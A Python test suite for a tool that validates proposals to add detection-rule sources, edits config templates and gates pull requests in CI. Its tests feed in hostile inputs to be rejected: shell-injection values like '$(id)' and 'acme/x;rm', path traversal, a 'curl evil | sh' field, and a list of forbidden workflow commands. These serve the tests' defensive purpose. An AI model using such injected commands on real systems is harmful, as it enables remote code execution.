"""scripts/source_proposal.py: re-validation of an authorized proposal in repository code, the four template edits, the required check, and the pull workflow. Offline."""
import base64, copy, hashlib, json, pathlib, re, shutil, subprocess, sys, tempfile, unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'scripts'))
import licensing, source_proposal as sp

SRC = json.loads((ROOT / 'config/sources.json').read_text())['sources']
LICENSE_TEXT = 'MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software.\n'
LIC_SHA = hashlib.sha256(LICENSE_TEXT.encode()).hexdigest()
PAYLOAD = {'admission': 'probation', 'id': 'acme-feed', 'kind': 'rules', 'license': {'sha256': LIC_SHA, 'spdx': 'MIT'}, 'paths': ['yara', 'rules/x'], 'repo': 'acme/yara-feed', 'verified_commit': 'b' * 40}


def item(payload=None):
    p = copy.deepcopy(payload or PAYLOAD); return {'id': '00000000-0000-4000-8000-000000000001', 'version': 3, 'payload': p, 'payload_sha256': sp.digest(p)}


def reissue(**over):
    p = copy.deepcopy(PAYLOAD); p.update(over); return item(p)


def github(license_text=LICENSE_TEXT, spdx='MIT', **flags):
    def get(path):
        if path.endswith('/license'): return {'license': {'spdx_id': spdx}, 'content': base64.b64encode(license_text.encode()).decode()}
        return {'private': False, 'fork': False, 'archived': False, 'disabled': False, 'license': {'spdx_id': spdx}, **flags}
    return get


class Digest(unittest.TestCase):
    def test_the_digest_is_the_vector_the_worker_test_pins(self):
        p = {'admission': 'probation', 'id': 'acme-feed', 'kind': 'rules', 'license': {'sha256': 'a' * 64, 'spdx': 'MIT'}, 'paths': ['yara', 'rules/x'], 'repo': 'acme/yara-feed', 'verified_commit': 'b' * 40}
        self.assertEqual(sp.digest(p), '44cd18e84160d7f1ee456a1fa8c9f48dd3ae61f17f7564da088cb336469ee6d5')
        self.assertIn("44cd18e84160d7f1ee456a1fa8c9f48dd3ae61f17f7564da088cb336469ee6d5", (ROOT / 'admin/worker/test/proposals.test.js').read_text())

    def test_duplicate_keys_are_refused_when_reading_the_service_answer(self):
        with self.assertRaises(sp.Invalid): sp.loads('{"proposals":[{"id":"a","id":"b"}]}')


class Validate(unittest.TestCase):
    def test_a_good_proposal_passes(self): self.assertEqual(sp.validate(item(), SRC), PAYLOAD)

    def test_every_hostile_value_is_refused_and_a_trailing_newline_is_not_forgiven(self):
        bad_ids = ['acme\n', 'acme-feed\n', '', 'a', 'A-B', 'a b', '$(id)', '`id`', '../x', 'a/b', 'x' * 32 + 'x', 'x' * 10_000, 'a‮b', 'ünï', 'synthetic-test', 'abc-', '-abc', None, 5, ['a']]
        for v in bad_ids: self.assertRaises(sp.Invalid, sp.validate, reissue(id=v))
        for v in ['acme/yara-feed\n', 'acme/yara\nfeed', 'acme/../x', 'acme/.', 'acme/..', 'acme//x', '/x', 'acme', 'a/b/c', 'acme/y.git', '-acme/x', 'acme-/x', 'a--b/x', 'acme/y' + 'z' * 101, 'ac me/x', 'acme/x`id`', 'acme/$(id)', 'acme/x;rm', 'acme/ünï', 'http://acme/x', 5, None]:
            self.assertRaises(sp.Invalid, sp.validate, reissue(repo=v))
        for v in [[], ['../x'], ['a/../b'], ['/abs'], ['a//b'], ['a/'], ['.'], ['a\nb'], ['a`b'], ['$(x)'], ['a b'], ['a;b'], ['a‮b'], ['x' * 101], ['a', 'a'], [f'p{i}' for i in range(21)], 'yara', [5], [None], ['%2e%2e'], ['yara\n']]:
            self.assertRaises(sp.Invalid, sp.validate, reissue(paths=v))
        for v in ['rules\n', 'engine', None]: self.assertRaises(sp.Invalid, sp.validate, reissue(kind=v))
        for v in ['', 'graduated', None, 'probation\n']: self.assertRaises(sp.Invalid, sp.validate, reissue(admission=v))
        for v in ['a' * 63, 'A' * 64, 'g' * 64, 'a' * 64 + '\n', None]: self.assertRaises(sp.Invalid, sp.validate, reissue(license={'sha256': v, 'spdx': 'MIT'}))
        for v in ['a' * 39, 'a' * 41, 'A' * 40, 'b' * 40 + '\n', None]: self.assertRaises(sp.Invalid, sp.validate, reissue(verified_commit=v))
        for v in ['GPL-3.0', 'NOASSERTION', 'Detection Rule License', 'MIT\n', '', 'MIT OR GPL-3.0', None]: self.assertRaises(sp.Invalid, sp.validate, reissue(license={'sha256': LIC_SHA, 'spdx': v}))

    def test_the_contract_is_exact_extra_missing_or_altered_fields_are_refused(self):
        for extra in ({'reason': 'x'}, {'run': 'curl evil | sh'}, {'paths2': []}): self.assertRaises(sp.Invalid, sp.validate, reissue(**extra))
        missing = item(); del missing['payload']['paths']; missing['payload_sha256'] = sp.digest(missing['payload']); self.assertRaises(sp.Invalid, sp.validate, missing, SRC)
        tampered = item(); tampered['payload']['paths'] = ['elsewhere']; self.assertRaises(sp.Invalid, sp.validate, tampered, SRC)   # digest no longer matches
        wrong = item(); wrong['payload_sha256'] = '0' * 64; self.assertRaises(sp.Invalid, sp.validate, wrong, SRC)
        top = item(); top['command'] = 'x'; self.assertRaises(sp.Invalid, sp.validate, top, SRC)
        self.assertRaises(sp.Invalid, sp.validate, {'payload': PAYLOAD}, SRC); self.assertRaises(sp.Invalid, sp.validate, 'x', SRC); self.assertRaises(sp.Invalid, sp.validate, None, SRC)

    def test_existing_sources_are_never_overwritten_or_imitated_by_case(self):
        self.assertRaises(sp.Invalid, sp.validate, reissue(id='nextron'), SRC)
        self.assertRaises(sp.Invalid, sp.validate, reissue(repo='neo23x0/SIGNATURE-BASE'), SRC)
        self.assertRaises(sp.Invalid, sp.validate, reissue(repo='VirusTotal/yara-x'), SRC)

    def test_reverify_catches_what_changed_since_the_verification(self):
        sp.reverify(PAYLOAD, github())
        for kw in ({'private': True}, {'fork': True}, {'archived': True}, {'disabled': True}): self.assertRaises(sp.Invalid, sp.reverify, PAYLOAD, github(**kw))
        self.assertRaises(sp.Invalid, sp.reverify, PAYLOAD, github(license_text=LICENSE_TEXT + ' edited'))
        self.assertRaises(sp.Invalid, sp.reverify, PAYLOAD, github(spdx='GPL-3.0'))


class Edits(unittest.TestCase):
    def setUp(self):
        self.root = pathlib.Path(tempfile.mkdtemp()); self.addCleanup(shutil.rmtree, self.root)
        for f in sp.FILES: (self.root / f).parent.mkdir(parents=True, exist_ok=True); shutil.copy(ROOT / f, self.root / f)
        self.out = self.root / 'out'

    def test_prepare_changes_exactly_the_template_files_and_nothing_else_in_them(self):
        before = {f: (self.root / f).read_text() for f in sp.FILES}
        sp.prepare(item(), self.root, self.out, github())
        s = (self.root / 'config/sources.json').read_text(); old = before['config/sources.json']
        self.assertEqual(json.loads(s)['sources'][:-1], json.loads(old)['sources']); self.assertEqual(json.loads(s)['sources'][-1], {'id': 'acme-feed', 'repo': 'acme/yara-feed', 'kind': 'rules', 'paths': ['yara', 'rules/x'], 'admission': 'probation'})
        old_lines, new_lines = old.split('\n'), s.split('\n')
        last = old_lines.index('  ]') - 1
        self.assertEqual(new_lines[:last], old_lines[:last], 'every earlier line is byte-identical'); self.assertEqual(new_lines[last], old_lines[last] + ','); self.assertEqual(new_lines[last + 2:], old_lines[last + 1:]); self.assertEqual(len(new_lines), len(old_lines) + 1)
        self.assertEqual(s.count('"admission"'), 1, 'the three current sources are untouched'); self.assertTrue(s.endswith('\n') == old.endswith('\n'))
        pol = json.loads((self.root / 'config/policy.json').read_text()); self.assertEqual(pol['licenses']['acme/yara-feed'], {'expected_spdx': 'MIT', 'spdx': 'MIT', 'redistribution': 'allowed-with-license-notice', 'sha256': LIC_SHA})
        old_pol = json.loads(before['config/policy.json']); pol2 = copy.deepcopy(pol); del pol2['licenses']['acme/yara-feed']; self.assertEqual(pol2, old_pol)
        for lang in ('es', 'en'):
            t = (self.root / f'docs-src/{lang}/sources.md').read_text(); self.assertIn('`acme/yara-feed`', t)
            self.assertEqual(len(t.split('\n')), len(before[f'docs-src/{lang}/sources.md'].split('\n')) + 1)
            for entry in json.loads(s)['sources']: self.assertIn(f"`{entry['repo']}`", t, 'tests/test_docs.py: every source is documented')
        self.assertEqual((self.out / 'branch').read_text(), f"proposal/acme-feed-{item()['payload_sha256'][:8]}"); self.assertTrue(sp.BRANCH.fullmatch((self.out / 'branch').read_text()))
        note = (self.root / (self.out / 'note').read_text()).read_text(); self.assertIn('acme/yara-feed', note)

    def test_the_licence_entry_works_with_the_pipelines_own_licence_check_and_turns_a_later_edit_into_a_failure(self):
        sp.prepare(item(), self.root, self.out, github()); rule = json.loads((self.root / 'config/policy.json').read_text())['licenses']['acme/yara-feed']
        self.assertTrue(licensing.verdict(rule, 'MIT', LICENSE_TEXT)['ok'])
        v = licensing.verdict(rule, 'MIT', LICENSE_TEXT + 'and also this'); self.assertFalse(v['ok']); self.assertIn('changed', v['detail'])
        self.assertFalse(licensing.verdict(rule, 'GPL-3.0', LICENSE_TEXT)['ok'])

    def test_nothing_is_written_when_anything_is_wrong(self):
        before = {f: (self.root / f).read_text() for f in sp.FILES}
        for bad in (reissue(repo='acme/yara\nfeed'), reissue(id='nextron'), reissue(paths=['../x']), reissue(license={'sha256': LIC_SHA, 'spdx': 'GPL-3.0'})):
            self.assertRaises(sp.Invalid, sp.prepare, bad, self.root, self.out, github())
        self.assertRaises(sp.Invalid, sp.prepare, item(), self.root, self.out, github(license_text='changed'))
        self.assertEqual({f: (self.root / f).read_text() for f in sp.FILES}, before); self.assertFalse((self.root / 'docs/source-proposals').exists()); self.assertFalse(self.out.exists())

    def test_a_file_that_is_not_in_the_expected_layout_is_not_edited(self):
        (self.root / 'config/sources.json').write_text(json.dumps(json.loads((ROOT / 'config/sources.json').read_text())))   # one line
        self.assertRaises(sp.Invalid, sp.prepare, item(), self.root, self.out, github())
        shutil.copy(ROOT / 'config/sources.json', self.root / 'config/sources.json'); (self.root / 'config/policy.json').write_text(json.dumps(json.loads((ROOT / 'config/policy.json').read_text())))
        self.assertRaises(sp.Invalid, sp.prepare, item(), self.root, self.out, github())

    def test_an_id_in_the_title_body_or_note_is_always_validated_text(self):
        sp.prepare(item(), self.root, self.out, github()); title, body = (self.out / 'title').read_text(), (self.out / 'body.md').read_text()
        self.assertEqual(title, 'Add rules source acme-feed (acme/yara-feed)'); self.assertNotIn('community feed', body)
        self.assertNotIn('\n', title); self.assertFalse(re.search(r'[`$]\(', title + body))


class Gate(unittest.TestCase):
    def setUp(self):
        self.base = {'config/sources.json': (ROOT / 'config/sources.json').read_text(), 'config/policy.json': (ROOT / 'config/policy.json').read_text()}
        self.root = pathlib.Path(tempfile.mkdtemp()); self.addCleanup(shutil.rmtree, self.root)
        for f in sp.FILES: (self.root / f).parent.mkdir(parents=True, exist_ok=True); shutil.copy(ROOT / f, self.root / f)
        sp.prepare(item(), self.root, self.root / 'out', github()); self.head = {f: (self.root / f).read_text() for f in self.base}
        self.files = list(sp.FILES) + ['docs/source-proposals/acme-feed.md']; self.ref = f"proposal/acme-feed-{item()['payload_sha256'][:8]}"

    def test_the_pull_request_the_workflow_builds_passes(self): self.assertEqual(sp.gate(self.files, self.base, self.head, self.ref), [])

    def test_pull_requests_that_touch_neither_file_pass_even_on_a_proposal_looking_branch_of_docs(self):
        self.assertEqual(sp.gate(['README.md'], self.base, self.base, 'feature/x'), []); self.assertEqual(sp.gate(['docs-src/en/sources.md'], self.base, self.base, 'docs'), [])
        self.assertEqual(sp.gate([], self.base, self.base, ''), [])

    def test_a_proposal_branch_may_change_nothing_else(self):
        for extra in ('.github/workflows/daily.yml', 'scripts/decide.py', 'admin/worker/src/index.js', 'tests/test_decide.py', 'config/license-allowlist.json', 'docs/source-proposals/other.md'):
            self.assertTrue(sp.gate(self.files + [extra], self.base, self.head, self.ref), extra)
        self.assertTrue(sp.gate([f for f in self.files if not f.startswith('docs/')], self.base, self.head, self.ref), 'the note is required')
        self.assertTrue(sp.gate(self.files, self.base, self.head, 'proposal/x'), 'branch name'); self.assertTrue(sp.gate(self.files, self.base, self.head, 'proposal/acme-feed-ZZZZZZZZ'))

    def test_a_hand_written_pull_request_is_held_to_the_same_rules(self):
        h = copy.deepcopy(self.head); entries = json.loads(h['config/sources.json'])
        def with_entry(mutate, policy=None):
            e = json.loads(self.head['config/sources.json']); mutate(e['sources'][-1]); hh = dict(self.head); hh['config/sources.json'] = json.dumps(e)
            if policy is not None: hh['config/policy.json'] = json.dumps(policy)
            return sp.gate(['config/sources.json', 'config/policy.json'], self.base, hh, 'feature/x')
        self.assertEqual(with_entry(lambda e: None), [])
        self.assertTrue(with_entry(lambda e: e.pop('admission')), 'a new rules source must be on probation')
        self.assertTrue(with_entry(lambda e: e.update(admission='')))
        self.assertTrue(with_entry(lambda e: e.update(extra='x')))
        self.assertTrue(with_entry(lambda e: e.update(id='Bad ID')))
        pol = json.loads(self.head['config/policy.json']); del pol['licenses']['acme/yara-feed']; self.assertTrue(with_entry(lambda e: None, pol), 'no licence entry')
        pol = json.loads(self.head['config/policy.json']); del pol['licenses']['acme/yara-feed']['sha256']; self.assertTrue(with_entry(lambda e: None, pol), 'a licence entry without the digest of the text')
        pol = json.loads(self.head['config/policy.json']); pol['licenses']['stray/entry'] = {'spdx': 'MIT'}; self.assertTrue(with_entry(lambda e: None, pol), 'a licence entry that belongs to nothing')
        two = json.loads(self.head['config/sources.json']); two['sources'].append({'id': 'second', 'repo': 'o/second', 'kind': 'rules', 'paths': ['y'], 'admission': 'probation'})
        hh = dict(self.head); hh['config/sources.json'] = json.dumps(two); self.assertTrue(any('one source per pull request' in x for x in sp.gate(['config/sources.json', 'config/policy.json'], self.base, hh, 'feature/x')))
        edited = json.loads(self.base['config/sources.json']); edited['sources'][0]['paths'] = ['elsewhere']; hh = {'config/sources.json': json.dumps(edited), 'config/policy.json': self.base['config/policy.json']}
        self.assertEqual(sp.gate(['config/sources.json'], self.base, hh, 'feature/x'), [], 'one modification by a person is allowed; the review is the control')

    def test_the_command_line_check_runs_on_a_real_repository(self):
        repo = pathlib.Path(tempfile.mkdtemp()); self.addCleanup(shutil.rmtree, repo)
        env = {'PATH': '/usr/bin:/bin:/usr/local/bin', 'GIT_AUTHOR_NAME': 't', 'GIT_AUTHOR_EMAIL': 't@x', 'GIT_COMMITTER_NAME': 't', 'GIT_COMMITTER_EMAIL': 't@x', 'HOME': str(repo)}
        run = lambda *a, cwd=repo: subprocess.run(a, cwd=cwd, env=env, capture_output=True, text=True)
        run('git', 'init', '-q', '-b', 'main'); (repo / 'scripts').mkdir()
        for f in ('scripts/source_proposal.py', 'scripts/quarantine_client.py', *self.base): (repo / f).parent.mkdir(parents=True, exist_ok=True); shutil.copy(ROOT / f, repo / f)
        run('git', 'add', '-A'); run('git', 'commit', '-qm', 'base'); run('git', 'switch', '-q', '-c', 'proposal/x')
        gate = lambda: run(sys.executable, '-B', 'scripts/source_proposal.py', 'gate', '--base', 'main', '--head-ref', self.ref)
        (repo / 'README.md').write_text('x'); run('git', 'add', '-A'); run('git', 'commit', '-qm', 'readme'); r = gate(); self.assertEqual(r.returncode, 1, r.stdout + r.stderr); self.assertIn('may only change', r.stdout)
        run('git', 'reset', '-q', '--hard', 'main')
        for f in self.base: (repo / f).write_text(self.head[f])
        (repo / 'docs/source-proposals').mkdir(parents=True); (repo / 'docs/source-proposals/acme-feed.md').write_text('note')
        run('git', 'add', '-A'); run('git', 'commit', '-qm', 'proposal'); r = gate(); self.assertEqual(r.returncode, 0, r.stdout + r.stderr); self.assertIn('source-proposal-gate: ok', r.stdout)
        (repo / 'scripts' / 'decide.py').write_text('x'); run('git', 'add', '-A'); run('git', 'commit', '-qm', 'smuggle'); r = gate(); self.assertEqual(r.returncode, 1); self.assertIn('scripts/decide.py', r.stdout)


class Workflow(unittest.TestCase):
    TEXT = (ROOT / '.github' / 'workflows' / 'source-proposals.yml').read_text()

    def test_triggers_permissions_and_environment_are_the_minimum(self):
        head, jobs = self.TEXT.split('\njobs:\n', 1); head = head[head.index('\non:\n') + 1:]   # the comments above talk about pull_request on purpose
        self.assertRegex(head,r'(?m)^on:\n  schedule:\n    - cron: .*\n  workflow_dispatch:\n'); self.assertNotRegex(head, r'pull_request|issue_comment|repository_dispatch|push:|workflow_run')
        self.assertRegex(head, r'(?m)^permissions: \{\}$'); self.assertRegex(head, r'concurrency:\n  group: source-proposals\n  cancel-in-progress: false')
        perms = re.search(r'    permissions:\n((?:      .*\n)+)', jobs).group(1); self.assertEqual(sorted(re.findall(r'^      ([a-z-]+): (\w+)', perms, re.M)), [('contents', 'write'), ('id-token', 'write'), ('pull-requests', 'write')])
        self.assertIn('environment: source-proposals', jobs); self.assertEqual(len(re.findall(r'(?m)^  [a-z][a-z-]*:$', jobs)), 1)

    def test_it_cannot_merge_approve_force_tag_or_use_a_secret(self):
        for forbidden in ('gh pr merge', '--auto', '--admin', 'gh pr review', '--force', ' tag ', 'git tag', 'release', 'secrets.', 'workflow run', 'git push origin main', 'actions: write'): self.assertNotIn(forbidden, self.TEXT, forbidden)
        self.assertEqual(re.findall(r'git push [^\n]*', self.TEXT), ['git push origin "HEAD:refs/heads/$branch" || { status=1; continue; }'])
        self.assertIn('branch="$(cat "$out/branch")"', self.TEXT); self.assertRegex(self.TEXT, r'git add -- config/sources\.json config/policy\.json docs-src/en/sources\.md docs-src/es/sources\.md "\$note"')

    def test_no_expression_is_interpolated_into_a_script(self):
        for block in re.findall(r'run: \|\n((?:          .*\n|\n)+)', self.TEXT): self.assertNotIn('${{', block)

    def test_the_workflow_is_registered_nowhere_by_accident_and_passes_actionlint(self):
        import shutil as sh
        if not sh.which('actionlint'): self.skipTest('actionlint not installed')
        r = subprocess.run(['actionlint', str(ROOT / '.github' / 'workflows' / 'source-proposals.yml'), str(ROOT / '.github' / 'workflows' / 'ci.yml')], capture_output=True, text=True); self.assertEqual(r.returncode, 0, r.stdout + r.stderr)

    def test_the_ci_gate_job_has_no_path_filter_and_reads_the_branch_names_through_env(self):
        ci = (ROOT / '.github' / 'workflows' / 'ci.yml').read_text(); job = ci.split('  source-proposal-gate:\n', 1)[1]
        self.assertIn('HEAD_REF: ${{ github.head_ref }}', job); self.assertNotRegex(job.split('run: |', 1)[1], r'\$\{\{')


if __name__ == '__main__':
    unittest.main()
